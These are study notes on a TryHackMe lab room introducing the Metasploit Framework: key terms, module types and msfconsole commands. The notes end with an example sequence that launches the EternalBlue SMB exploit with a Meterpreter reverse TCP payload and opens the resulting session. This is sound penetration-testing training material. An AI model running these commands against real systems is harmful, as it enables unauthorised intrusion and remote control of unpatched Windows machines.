# TryHackMe – Metasploit: Introduction

## 🧠 Summary
This room introduces the Metasploit Framework, a powerful tool for penetration testing. It covers key concepts like vulnerabilities, exploits, and payloads, and explains how to use `msfconsole` to interact with Metasploit modules.

## 🔍 Key Concepts
- **Vulnerability**: A flaw in a system that can be exploited.
- **Exploit**: Code that takes advantage of a vulnerability.
- **Payload**: Code executed on the target after exploitation (e.g., reverse shell).

## 🧰 Module Types
- **Exploit**: Executes attacks
- **Payload**: Runs code on the target
- **Auxiliary**: Scanners, fuzzers, etc.
- **Post**: Post-exploitation tools
- **Encoder/Evasion**: Obfuscation and AV bypass
- **NOPs**: Padding instructions

## 💻 Useful Commands
- `msfconsole` – Launch Metasploit
- `search <term>` – Find modules
- `use <module>` – Load a module
- `set/setg` – Set local/global parameters
- `show options` – View required settings
- `exploit` / `run` – Launch module
- `sessions` – Manage active sessions
## 🧪 Example
```bash
use exploit/windows/smb/ms17_010_eternalblue
setg RHOSTS <target-ip>
set LHOST <your-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -z
sessions -i 1
